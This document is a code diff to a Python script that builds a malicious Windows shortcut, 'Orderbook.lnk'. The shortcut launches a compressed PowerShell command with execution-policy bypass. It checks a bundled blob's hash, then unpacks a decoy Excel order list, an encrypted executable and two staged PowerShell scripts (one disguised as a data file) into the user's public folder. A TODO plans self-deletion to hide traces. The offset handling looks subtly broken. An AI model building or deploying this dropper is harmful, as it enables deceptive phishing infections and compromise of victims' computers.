@@ -1,5 +1,6 @@
 import os
 import sys
+import hashlib
 from win32com.client import Dispatch
 from typing import List, Dict
 
@@ -44,10 +45,10 @@ def create_dummy_data_file(data_paths: List[str], output_path: str) -> Dict[str,
                     continue
                 with open(abs_data_path, "rb") as data_file:
                     print(f"Writing {abs_data_path} to {output_path} at offset {current_offset}")
-                    offsets[data_path] = current_offset
                     data = data_file.read()
                     f.write(data)
                     current_offset += len(data)
+                    offsets[data_path] = current_offset
     except Exception as e:
         print(f"Error while creating dummy data file: {e}")
         sys.exit(1)
@@ -100,11 +101,18 @@ if __name__ == "__main__":
     ## Step 1: Create the dummy data
     # Define data paths (use absolute paths for reliability)
     data_paths = [
-        os.path.abspath("../asset/KnightShopOrderList.xlsx"),      # Benign Excel file
-        os.path.abspath("../../client/dist/client_encrypted.exe")  # Encrypted client executable
+        os.path.abspath("../asset/KnightShopOrderList.xlsx"),      #           Benign Excel file
+        os.path.abspath("../../client/dist/client_encrypted.exe"), #           Encrypted client executable
+        os.path.abspath("../scripts/find.ps1"),                    # (Stage 2) PowerShell script to decrypt the client executable
+        os.path.abspath("../scripts/search.dat"),                  # (Stage 3) PowerShell script camouflaged as a data file, invoked by Stage 2
     ]
     output_path = os.path.abspath("dummy_data.bin")
     offsets = create_dummy_data_file(data_paths, output_path)
+
+    # Calculate the MD5 hash of the dummy data file
+    with open(output_path, "rb") as f:
+        dummy_data = f.read()
+        md5_hash = hashlib.md5(dummy_data).hexdigest()
 
     # Ensure that the required files were written
     if not os.path.isfile(output_path):
@@ -113,18 +121,53 @@ if __name__ == "__main__":
 
     ## Step 2: Create the PowerShell script
     # Injected PowerShell Script Content
+    # TODO: At last, the lnk file should be self-deleted for clearance as well as the dummy file
     ps1_content = f"""
-$targetFileName = 'KnightShopOrderList.lnk'
-
+# Self-discovery to find the location of the shortcut(this)
+$target = 'Orderbook.lnk'
 $searchDir = $env:USERPROFILE
+$lnk = Get-ChildItem -Path $searchDir -Recurse -Filter $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DirectoryName
 
-$lnkPath = Get-ChildItem -Path $searchDir -Recurse -Filter $targetFileName -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DirectoryName
-
-if ($lnkPath) {{
-    Write-Output $lnkPath
-}} else {{
-    Write-Output 'Shortcut not found.'
+if (-not $lnk) {{
+    # Unable to proceed
+    exit -1
 }}
+
+# Ensure that the dummy data file also exists in the current position and hash check
+$dummy = Join-Path $lnk 'dummy_data.bin'
+$md5 = (Get-FileHash -Path $dummy -Algorithm MD5).Hash
+if ($md5 -ne '{md5_hash}') {{
+    # Unable to proceed
+    exit -1
+}}
+
+# Extract the data from the dummy data
+$fs = [System.IO.File]::OpenRead($dummy)
+$br = New-Object System.IO.BinaryReader($fs)
+
+# (1) Benign excel file
+$f1 = Join-Path $lnk 'Order.xlsx'
+$f1d = $br.ReadBytes({offsets[data_paths[0]]})
+[System.IO.File]::WriteAllBytes($f1, $f1d)
+
+# (2) Encrypted client executable
+$pub = $env:public
+$f2 = Join-Path $pub 'c.exe.e'
+$f2d = $br.ReadBytes({offsets[data_paths[1]]})
+[System.IO.File]::WriteAllBytes($f2, $f2d)
+
+# (3) find.ps1, which is the PowerShell script to decrypt the client executable
+$f3 = Join-Path $pub 'fd.ps1'
+$f3d = $br.ReadBytes({offsets[data_paths[2]]})
+[System.IO.File]::WriteAllBytes($f3, $f3d)
+
+# (4) search.dat, which is the data file for the find.ps1 script
+$f4 = Join-Path $pub 'search.dat'
+$f4d = $br.ReadBytes({offsets[data_paths[3]]})
+[System.IO.File]::WriteAllBytes($f4, $f4d)
+
+$br.Close()
+$fs.Close()
 """
 
     # Compress the PowerShell script
@@ -137,7 +180,7 @@ if ($lnkPath) {{
     except NameError:
         current_directory = os.getcwd()
 
-    shortcut_name = "KnightShopOrderList.lnk"
+    shortcut_name = "Orderbook.lnk"
     shortcut_path = os.path.join(current_directory, shortcut_name)
     powershell_path = get_powershell_path()
     arguments = f'-ExecutionPolicy Bypass -NoExit -Command "{compressed_ps1}"'
